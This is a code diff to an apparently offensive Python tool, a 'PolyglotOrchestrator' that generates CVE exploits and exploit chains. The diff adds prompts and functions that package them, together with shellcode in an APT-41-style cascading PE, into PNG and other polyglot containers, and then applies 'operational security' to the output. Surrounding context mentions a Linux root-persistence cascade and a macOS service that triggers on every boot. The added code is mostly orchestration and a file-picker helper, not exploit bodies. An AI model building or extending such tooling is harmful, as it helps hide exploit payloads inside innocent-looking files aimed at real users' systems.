@@ -26,6 +26,14 @@ import argparse
 from typing import List, Dict, Any, Optional
 from datetime import datetime
 
+# Try to import tkinter for file dialogs
+try:
+    import tkinter as tk
+    from tkinter import filedialog
+    TKINTER_AVAILABLE = True
+except ImportError:
+    TKINTER_AVAILABLE = False
+
 # Add tools to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -220,6 +228,11 @@ class PolyglotOrchestrator:
             validation = self.opsec.validate_operational_security(output_file)
             self.tui.info(f"OpSec Status: {validation.get('opsec_status', 'UNKNOWN')}")
 
+            # Offer to package into polyglot
+            print()
+            if self.menu.confirm("Package exploit into polyglot container?", default=True):
+                self._package_single_exploit_into_polyglot(cve_id)
+
         except Exception as e:
             self.tui.error(f"Exploit generation failed: {e}")
 
@@ -253,17 +266,7 @@ class PolyglotOrchestrator:
             return
 
         # Prompt for custom container file
-        custom_file = None
-        print()
-        self.tui.info(f"Select container file for {polyglot_type} polyglot:")
-        self.tui.list_item("Press Enter to use default (generated file)", level=1)
-        self.tui.list_item("Or provide path to custom container file", level=1)
-        print()
-
-        custom_file = self.menu.prompt_input(
-            "Container file path (or press Enter for default)",
-            default=""
-        )
+        custom_file = self._prompt_custom_file(f"{polyglot_type} container")
 
         # Validate custom file
         custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
@@ -349,6 +352,11 @@ class PolyglotOrchestrator:
 
             self.tui.success(f"Campaign complete: {len(self.artifacts)} artifacts generated")
 
+            # Offer to package into polyglot
+            print()
+            if self.menu.confirm("Package chain into polyglot container?", default=True):
+                self._package_chain_into_polyglot(best_chain['cves'], platform)
+
         except Exception as e:
             self.tui.error(f"Chain analysis failed: {e}")
 
@@ -371,16 +379,7 @@ class PolyglotOrchestrator:
             return
 
         # Prompt for PNG container
-        print()
-        self.tui.info("Select PNG container for APT-41 polyglot:")
-        self.tui.list_item("Press Enter to use default (minimal 64x64 PNG)", level=1)
-        self.tui.list_item("Or provide path to custom PNG image", level=1)
-        print()
-
-        custom_png = self.menu.prompt_input(
-            "PNG image path (or press Enter for default)",
-            default=""
-        )
+        custom_png = self._prompt_custom_file("PNG container")
 
         output_file = "5AF0PfnN_replica.png"
         self.tui.info("Generating APT-41 polyglot (this may take a moment)...")
@@ -469,6 +468,11 @@ class PolyglotOrchestrator:
                         self.artifacts.append(output_file)
                         self._apply_opsec(output_file)
                         self.tui.success(f"Generated: {output_file}")
+
+                    # Offer to package into polyglot
+                    print()
+                    if self.menu.confirm("Package chain into polyglot container?", default=True):
+                        self._package_chain_into_polyglot(chain['cves'], platform)
             else:
                 self.tui.warning("No chains available")
 
@@ -814,16 +818,7 @@ sudo /usr/local/bin/cpu_desync_linux
         self.tui.info("Generating Linux CVE cascade (PNG vector)...")
 
         # Prompt for PNG container selection
-        print()
-        self.tui.info("Select PNG container for payload embedding:")
-        self.tui.list_item("Press Enter to use default minimal PNG (64x64)", level=1)
-        self.tui.list_item("Or provide path to custom PNG image", level=1)
-        print()
-
-        custom_png = self.menu.prompt_input(
-            "PNG image path (or press Enter for default)",
-            default=""
-        )
+        custom_png = self._prompt_custom_file("PNG container")
 
         # Most guaranteed Linux CVE cascade: HFS+ heap overflow -> Kernel OOB write -> Root persistence
         # Delivered as PNG polyglot for maximum compatibility
@@ -1328,6 +1323,92 @@ sudo /usr/local/bin/cpu_desync_macos
         self.tui.list_item("Run ./install_cpu_desync_macos.sh", level=1)
         self.tui.list_item("Service will trigger immediately and on every boot", level=1)
 
+    def _package_single_exploit_into_polyglot(self, cve_id: str):
+        """Package single exploit into polyglot container"""
+        self.tui.section("📦 Polyglot Packaging")
+
+        # Select polyglot type
+        polyglot_type = self._select_polyglot_type_simple()
+        if polyglot_type is None:
+            return
+
+        # Prompt for custom container file
+        custom_file = self._prompt_custom_file(f"{polyglot_type} container")
+
+        # Validate custom file
+        custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
+
+        # Generate polyglot with single exploit
+        output_file = f"polyglot_{cve_id.replace('-', '_')}_{polyglot_type}.png"
+        self.tui.info(f"Packaging exploit into {polyglot_type} polyglot...")
+
+        try:
+            if polyglot_type == 'apt41':
+                # APT-41 cascading PE
+                shellcode = self.polyglot_gen.generator.generate_shellcode('poc_marker')
+                self.polyglot_gen.create_apt41_cascading_polyglot(shellcode, output_file, custom_file_path)
+            else:
+                # Standard polyglot with single CVE
+                self.polyglot_gen.generate(polyglot_type, output_file, [cve_id], custom_file_path)
+
+            self.artifacts.append(output_file)
+            size_mb = os.path.getsize(output_file) / (1024 * 1024)
+            self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
+
+            # Show what's inside
+            self.tui.info(f"Polyglot contains: {cve_id}")
+
+            # Apply OpSec
+            if self.menu.confirm("Apply operational security?", default=True):
+                self._apply_opsec(output_file)
+
+        except Exception as e:
+            self.tui.error(f"Polyglot packaging failed: {e}")
+
+    def _package_chain_into_polyglot(self, cve_list: List[str], platform: TargetPlatform):
+        """Package exploit chain into polyglot container"""
+        self.tui.section("📦 Polyglot Packaging")
+
+        # Select polyglot type
+        polyglot_type = self._select_polyglot_type_simple()
+        if polyglot_type is None:
+            return
+
+        # Prompt for custom container file
+        custom_file = self._prompt_custom_file(f"{polyglot_type} container")
+
+        # Validate custom file
+        custom_file_path = custom_file if custom_file and os.path.isfile(custom_file) else None
+
+        # Generate polyglot with chain
+        output_file = f"campaign_{platform.value}_{polyglot_type}.png"
+        self.tui.info(f"Packaging {len(cve_list)} exploits into {polyglot_type} polyglot...")
+
+        try:
+            if polyglot_type == 'apt41':
+                # APT-41 cascading PE
+                shellcode = self.polyglot_gen.generator.generate_shellcode('poc_marker')
+                self.polyglot_gen.create_apt41_cascading_polyglot(shellcode, output_file, custom_file_path)
+            else:
+                # Standard polyglot with chain CVEs
+                self.polyglot_gen.generate(polyglot_type, output_file, cve_list, custom_file_path)
+
+            self.artifacts.append(output_file)
+            size_mb = os.path.getsize(output_file) / (1024 * 1024)
+            self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
+
+            # Show what's inside
+            self.tui.info("Polyglot contains:")
+            for i, cve_id in enumerate(cve_list, 1):
+                self.tui.list_item(f"Stage {i}: {cve_id}", level=1)
+
+            # Apply OpSec
+            if self.menu.confirm("Apply operational security?", default=True):
+                self._apply_opsec(output_file)
+
+        except Exception as e:
+            self.tui.error(f"Polyglot packaging failed: {e}")
+
     def _show_operation_summary(self):
         """Show operation summary (Vault7-style)"""
         self.tui.section("Operation Summary")
@@ -1361,6 +1442,74 @@ sudo /usr/local/bin/cpu_desync_macos
             default="CVE-2025-48593"
         )
         return cve_input if cve_input else None
+
+    def _prompt_custom_file(self, file_type: str = "container") -> Optional[str]:
+        """
+        Prompt for custom file selection with optional file dialog
+
+        Args:
+            file_type: Description of file type (e.g., "container", "PNG")
+
+        Returns:
+            File path if selected, None otherwise
+        """
+        print()
+        self.tui.info(f"Select {file_type} file:")
+
+        if TKINTER_AVAILABLE:
+            self.tui.list_item("Press 'B' to browse with file dialog", level=1)
+            self.tui.list_item("Press Enter to use default (generated file)", level=1)
+            self.tui.list_item("Or type file path directly", level=1)
+        else:
+            self.tui.list_item("Press Enter to use default (generated file)", level=1)
+            self.tui.list_item("Or type file path directly", level=1)
+        print()
+
+        user_input = self.menu.prompt_input(
+            f"{file_type.capitalize()} file path (or 'B' to browse, Enter for default)",
+            default=""
+        )
+
+        # Handle file browser
+        if TKINTER_AVAILABLE and user_input and user_input.upper() == 'B':
+            try:
+                # Create hidden root window
+                root = tk.Tk()
+                root.withdraw()
+                root.attributes('-topmost', True)
+
+                # Determine file types based on context
+                filetypes = [
+                    ("All Files", "*.*"),
+                    ("PNG Images", "*.png"),
+                    ("JPEG Images", "*.jpg *.jpeg"),
+                    ("ZIP Archives", "*.zip"),
+                    ("PDF Documents", "*.pdf"),
+                    ("GIF Images", "*.gif"),
+                ]
+
+                # Open file dialog
+                filepath = filedialog.askopenfilename(
+                    title=f"Select {file_type} file",
+                    filetypes=filetypes
+                )
+
+                # Destroy root
+                root.destroy()
+
+                if filepath:
+                    self.tui.success(f"Selected: {filepath}")
+                    return filepath
+                else:
+                    self.tui.warning("No file selected")
+                    return None
+
+            except Exception as e:
+                self.tui.error(f"File dialog error: {e}")
+                return None
+
+        # Return typed path or None for default
+        return user_input if user_input else None
 
     def _select_platform(self) -> Optional[TargetPlatform]:
         """Select target platform"""
